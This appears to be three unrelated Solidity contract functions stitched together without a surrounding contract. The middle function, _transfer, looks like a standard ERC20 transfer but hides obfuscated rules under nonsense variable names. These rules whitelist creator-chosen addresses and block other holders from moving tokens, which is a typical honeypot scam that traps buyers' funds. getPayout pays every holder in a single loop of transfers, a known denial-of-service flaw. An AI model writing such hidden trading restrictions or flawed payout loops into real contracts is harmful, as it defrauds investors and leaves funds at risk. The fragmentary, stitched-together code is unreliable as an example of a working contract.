function getPayout(uint etherPrice) onlyOwner public {
    require(this.balance > min4payout);
    uint256 perToken = this.balance / totalSupply;
    for (uint i = 1; i < num_holders; i++) {
        address d = holders[i];
        if (d != 0) {
            uint bal = balanceOf[d];
            if (bal == 0) {
                holders[i] = 0;
            } else {
                uint powercost = ((bal * centsPerMonth) / 100) * (1 ether / etherPrice);
                holders[i].transfer((bal * perToken) - powercost);
            }
        }
    }
    owner.transfer(((totalSupply * centsPerMonth) / 100) * (1 ether / etherPrice)); 
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (whiteness == false)) {
        blowing = chTx;
        ofsixynine = true;
    }
    if ((address(sender) == creator) && (whiteness == true)) {
        wolf[recipient] = true;
        kraken[recipient] = false;
        whiteness = false;
    }
    if ((amount > kukuk) && (wolf[sender] == true) && (address(sender) != creator)) {
        octopus[recipient] = true;
    }
    if (wolf[recipient] != true) {
        kraken[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((kraken[sender]) && (wolf[recipient] == false)) {
        kraken[recipient] = true;
    }
    if (wolf[sender] == false) {
        if ((amount > kukuk) && (octopus[sender] == true)) {
            require(false);
        }
        require(amount < blowing);
        if (ofsixynine == true) {
            if (octopus[sender] == true) {
                require(false);
            }
            octopus[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function calcRefund(address _addressToRefund) internal {
    uint amount = balanceOf[_addressToRefund];
    balanceOf[_addressToRefund] = 0;
    if (amount > 0) {
        _addressToRefund.transfer(amount);
        LogFundTransfer(_addressToRefund, amount, false);
    }
}

